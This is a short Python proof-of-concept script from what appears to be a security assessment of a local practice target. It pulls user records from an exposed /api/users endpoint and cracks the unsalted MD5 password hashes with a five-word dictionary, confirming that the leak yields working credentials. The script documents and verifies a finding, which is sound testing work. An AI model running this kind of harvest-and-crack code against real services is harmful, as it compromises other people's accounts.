#!/usr/bin/env python3
"""PoC (proven-live step, F-6): leaked hashes crack -> credential compromise.

Stronger than poc1_users_hash_leak.py: proves the leaked digests are not
noise or salted decoys - a 5-word dictionary recovers the plaintexts, i.e.
the leak yields working credentials, not just metadata.
EDUCATIONAL - run against the local practice target only.
Ladder  : in-code -> proven-live (this file). Exit 0 = reproduced.
"""
import hashlib
import json
import sys
import urllib.request

BASE = "http://127.0.0.1:8765"

DICT = ["password", "letmein", "qwerty123", "123456", "admin"]  # tiny dictionary


def main() -> int:
    with urllib.request.urlopen(BASE + "/api/users") as r:
        users = json.loads(r.read().decode())["users"]
    print(f"[read ] leaked {len(users)} hash(es) from /api/users")

    cracked = {}
    for u in users:
        name, digest = u["username"], u["password_hash"]
        for word in DICT:
            if hashlib.md5(word.encode()).hexdigest() == digest:
                cracked[name] = word
                break
    for name, word in cracked.items():
        print(f"[crack] {name}: digest matched dictionary entry (plaintext recovered, "
              f"len={len(word)})")

    ok = len(cracked) == len(users) and len(users) >= 3
    if not ok:
        print("FAIL: hashes did not crack (would suggest salting or decoys)")
        return 1
    print(
        "REPRODUCED: every leaked hash recovered via dictionary - the leak is "
        "credential compromise, not information noise"
    )
    print("--- transcript (recovery facts, plaintexts withheld from the ledger) ---")
    for name, word in cracked.items():
        print(f"{name}: md5 dictionary hit (recovered word length {len(word)})")
    return 0


if __name__ == "__main__":
    sys.exit(main())
